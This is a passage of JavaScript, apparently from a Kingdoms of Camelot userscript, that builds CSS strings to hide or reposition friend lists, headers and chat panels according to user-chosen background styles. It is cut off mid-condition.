	if (Options.hideFriends==true && Options.hideKoCBar==false && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 437px; position: absolute;  top: -255px; width: 760px; height: 1px;} ';}
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 437px; position: absolute;  top: -255px; width: 760px; height: 1px;} ';}
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true && Options.hideShowKoCBottomStuff==false && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none; } .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 306px; position: absolute;  top: -60px; width: 760px; height: 1px;}';}
	if (Options.hideFriends==false && Options.hideKoCBar==false && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav { float: left; height: 100px;    position: relative;    width: 36px;} .kocmain .panel_friendlist .panel_nav {float: left; height: 100px;    position: relative;    width: 36px;} .kocmain .panel_friendlist .panel_list { float: left;  height: 115px;  overflow-x: hidden;  position: relative;   width: 688px;} ';}
	// OLD KOC STYLE show/hide KoC Stuff
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none;}';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none;} ';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true && Options.hideShowKoCBottomStuff==true) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none;}';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==true) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; }';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==false && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false) {
	var showHideFriendList = '';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==false && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } ';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==false && Options.hideKoCBar==false && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav { float: left; height: 100px;    position: relative;    width: 36px;} .kocmain .panel_friendlist .panel_nav {float: left; height: 100px;    position: relative;    width: 36px;} .kocmain .panel_friendlist .panel_list { float: left;  height: 115px;  overflow-x: hidden;  position: relative;   width: 688px;}';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_list {display: none;}';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true && Options.hideShowKoCBottomStuff==false) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none;}';}
	if (Options.hideShowKoCBottomStuff==false) { var hideKoCBottomStuff = ''; }
	if (Options.hideShowKoCBottomStuff==true) { var hideKoCBottomStuff = '\
	.kocmain .panel_friendlist .panel_nav {display: none;  float: left; height: 100px;    position: relative;    width: 36px;}\
	.kocmain .panel_friendlist .panel_list {display: none;  float: left;  height: 115px;  overflow-x: hidden;  position: relative;   width: 688px;}\
	.kocmain .mod_directory { display: none;}\
	.kocmain .mod_cityinfo {  display: none;}\
	.kocmain { height: 470px;}\
	.kocmain .panel_friendlist { left: 307px; position: absolute;  top: -60px; width: 760px;}\
	.kocmain .kocmain_bottom {background: none repeat scroll 0 0 transparent; height: 0px; left: 0; position: absolute;  top: 464px; width: 760px; z-index: 0;}';
	}
	if (Options.pdxBackgroundStyle=="pdxBackgroundColor" || Options.pdxBackgroundStyle=="pdxOwnBackground" && Options.pbChatOnRight==false) { var pdxStyleSelBoxShadow = '#141516';	}
	if (Options.pdxBackgroundStyle=="pdxOwnBackgrounddark" || Options.pdxBackgroundStyle=="pdxBackgroundColordark" && Options.pbChatOnRight==false) { var pdxStyleSelBoxShadow = '#FFF';}
	if (Options.pdxBackgroundStyle=="pdxBackground11" && Options.pbChatOnRight==false) { var pdxStyleSelBoxShadow = '#FFF';	}

// KOC SCRIPTS STYLE + Chat on right
if (Options.pdxBackgroundStyle=="pdxBackground11" && Options.pbChatOnRight) { // Background Color is Dark -moz-border-radius:2px; border: 1px solid #FFF; -moz-box-shadow: 0 0 1px 2px #FFF;
	var styles = '\
	.kocmain .mod_cityinfo .cityinfo_body { height: 335px; padding-top: 18px; width: 195px;}\
	.kocHeader .domainRow a { color: #FFF; overflow: visible;  white-space: nowrap;}\
	.kocHeader .domainRow a:hover { color: #FF0000; overflow: visible;  white-space: nowrap;}\
	.kocHeader .leftColumn .gemCount {color: green; font-weight: bold;  height: 18px; line-height: 18px; margin: 0 0 5px 25px; overflow: hidden;  padding: 5px; text-align: center;    width: 114px;}\
	.kocHeader {  background: none repeat scroll 0 0 transparent;  height: 98px;  width: 760px; color: #FFF;}\
	.kocHeader .taskbar {  background: none;  height: 100%;  padding-top: 2px;}\
	.kocmain .mod_directory { height: 390px; left: 1px; position: absolute; top: 0; width: 200px;}\
	.kocmain .mod_directory #directory_tabs_2 .directory_upsell {color: #FFFFFF;  margin-left: 10px;}\
	.kocmain .mod_directory #directory_tabs_2 .directory_upsell a { color:#FFF;}\
	.kocmain .mod_directory #directory_tabs_2 .directory_upsell a:hover { color:#FF0000;}\
	.kocmain .mod_directory .directory_body .directory_subbody a { color:#FFF;}\
	.kocmain .mod_directory .directory_body .directory_subbody a:hover { color:#FF0000;}\
	.kocmain .mod_directory .directory_body .directory_subbody { color:#FFF; height: 260px;  margin-left: 10px; margin-top: 1px;  overflow-x: hidden;  overflow-y: scroll;  position: relative;   width: 186px;}\
	.kocmain .mod_directory #directory_tabs_2_members .leaders a { color:#FFF;}\
	.kocmain .mod_directory #directory_tabs_2_members .leaders a:hover { color:#FF0000; }\
	.kocmain .mod_directory #directory_tabs_2_members .leaders { color:#FFF; font-size: 14px;  font-weight: bold; margin-bottom: 5px;  text-align: center;}\
	.kocmain .mod_cityinfo #cityinfo_3 .unitcontainer, .kocmain .mod_cityinfo #cityinfo_4 .unitcontainer { -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; margin-left: 5px;}\
	.kocmain .mod_cityinfo #cityinfo_3 .unitcontainer td, .kocmain .mod_cityinfo #cityinfo_4 .unitcontainer td {-moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; padding: 3px 0;  width: 93px;  background-color: transparent; }\
	.kocmain .mod_cityinfo #cityinfo_2 table tbody td { background-color:transparent; font-weight: bold; padding: 5px 0; background: transparent;}\
	.kocmain .mod_cityinfo #cityinfo_2 table tbody tr td { padding: 5px 0; background: transparent;}\
	.kocmain .mod_cityinfo #cityinfo_1 table tbody td { background-color: none; border-bottom: 1px solid #E5DDC9;}\
	.kocmain .mod_cityinfo #cityinfo_1 table tbody tr td { background-color: transparent; border-bottom: 1px solid #E5DDC9;}\
	.kocmain .mod_cityinfo #cityinfo_1 table .grw {  padding-right: 5px; text-align: right; width: 60px;  background: none;}\
	.kocmain .mod_cityinfo #cityinfo_2 {height: 295px; overflow: auto; width:  210px; }\
	.kocmain .mod_cityinfo #cityinfo_1 .upsell {-moz-border-radius:2px; border: 1px solid #FFF; -moz-box-shadow: 0 0 1px 2px #141516; background-color: transparent; display: block; margin-left: 5px; padding: 5px 0; width: 190px;  color: #FFF !important;}\
	.kocmain .mod_cityinfo #cityinfo_1.cityinfo_body table { border:10px; }\
	#tournament_tab .datefoot { color: #FFF; font-size: 10px;  margin: 10px 0; }\
	.directory_body #tournament_tab .leaderrow {-moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF;}\
	#tournament_tab .leaderboardheader { color: #FFF; font-size: 14px; font-weight: bold;  padding-bottom: 10px; text-align: center;}\
	.kocmain .mod_directory {    height: 390px;    left: 1px;    position: absolute;    top: 0px;    width: 200px;    z-index: 1;}\
	.kocmain .mod_cityinfo {  color: #FFF;  left: 530px; overflow-x: hidden; position: absolute; top: -3px; width: 235px;}\
	.kocmain .kocmain_bottom { background: none; height: 390px; left: 0; position: absolute; top: 464px; width: 760px; z-index: 1 !important;}\
	.mod_comm_forum  a { font-variant:small-caps;  color:'+Colors.modCommForumA+';}\
	.mod_comm_forum a:hover { font-weight: bold; font-variant:small-caps; color:'+Colors.modCommForumAhover+'; text-decoration:none; text-shadow: 1px 1px 6px '+Colors.modCommForumAhover+';}\
	.kocmain .mod_comm .comm_global .chatlist .noalliance { color:#141516;   margin-top: 5px; -moz-box-shadow: 0 0 1px 1px #CCC;  -moz-border-radius:2px;}\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content { -moz-box-shadow: 0 0 1px 1px #FFF; padding:1.5px; -moz-border-radius:2px; border:1px inset #FF0000; color: '+Colors.ChatFontColor+'; float: left; position: relative; width: '+ (Options.chatWidth-60) +'px;  }\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content:hover { -moz-box-shadow: 0 0 2px 3px #CCC; padding:1.5px; -moz-border-radius:2px; border:1px inset #FF0000; color:#FF0000; float: left; position: relative; width: '+ (Options.chatWidth-60) +'px; }\
	.kocmain .mod_comm .comm_global .postaction .button20 {border: 1px inset '+Colors.MainTitle+'; display: block; line-height: 30px;  -moz-border-radius:6px; border:0px solid #141516; -moz-box-shadow: 0 0 2px 3px #FFF;}\
	.kocmain .mod_comm .comm_global .postaction #mod_comm_input {padding:10px;  -moz-border-radius:3px; border:0px inset #141516; -moz-box-shadow: 0 0 1px 3px #FFF; } \
	.kocmain .mod_comm .comm_global .postaction #mod_comm_input:hover {  border:0px inset #FF0000; -moz-box-shadow: 0 0 1px 1px #222; }';
	var friendListBackground = 'background: none;';
	var pdxStyleSelTop = '-1285px';
	var pdxStyleSelBoxShadow = '#FFF';
	var pdxInfoBoxTop = '-70px';
	var pdxlinkColor = '#FFF';
    var pdxlinkColorHover = 'color: #FF0000;';
	var pdxhelpButtonRight = '25px';
	var pdxpostAction = 'left: 30px; top:-55px; padding: 10px 10px; position: relative;  width: 340px;';
	var pdxModCommTop = 'top: 20px;';
	var pdxChatContentColor = '#FFF';
	var modChatlistBoarder = '3px 3px 3px 3px ';
	var modChatlistBoxShadow ='-moz-box-shadow: 0 0 2px 2px '+pdxStyleSelBoxShadow+';';
}
// ONLY IF BACKGROUND WALLPAPER AND COLOR (DARK) || COSTUM SETTINGS DARK + Chat on right
if (Options.pbChatOnRight && Options.pdxBackgroundStyle=="pdxOwnBackgrounddark" || Options.pdxBackgroundStyle=="pdxBackgroundColordark") { // Background Color is Dark
var styles = '';
	var friendListTop = '915px';
	var friendListBackground = 'background: none;';
	var pdxStyleSelTop = '-1285px';
    var pdxInfoBoxTop = '-70px';
	var pdxlinkColor = '#FFF';
    var pdxlinkColorHover = 'color: #FF0000;';
	var pdxStyleSelBoxShadow = '#FFF;';
	var pdxhelpButtonRight = '25px';
	var pdxpostAction = 'left: 30px; top:-55px; padding: 10px 10px; position: relative;  width: 340px;';
	}
// ONLY IF OWN BACKGROUND WALLPAPER AND COLOR (LIGHT) || COSTUM SETTINGS LIGHT + Chat on right
if (Options.pbChatOnRight && Options.pdxBackgroundStyle=="pdxBackgroundColor" || Options.pdxBackgroundStyle=="pdxOwnBackground") { // Background Color is Light
	var styles = '';
	var friendListTop = '915px';
	var friendListBackground = 'background: none;';
	var pdxStyleSelTop = '-1285px';
	var pdxInfoBoxTop = '-70px';
	var pdxlinkColor = '#FFF';
	var pdxlinkColorHover = 'color: #FF0000;';
	var pdxStyleSelBoxShadow = '#141516';
	var pdxhelpButtonRight = '25px';
	var pdxpostAction = 'left: 30px; top:-55px; padding: 10px 10px; position: relative;  width: 340px;';

	}
// DESIGN FOR ALL OTHER STYLES + Chat on right
if (Options.pbChatOnRight && Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" || Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" || Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  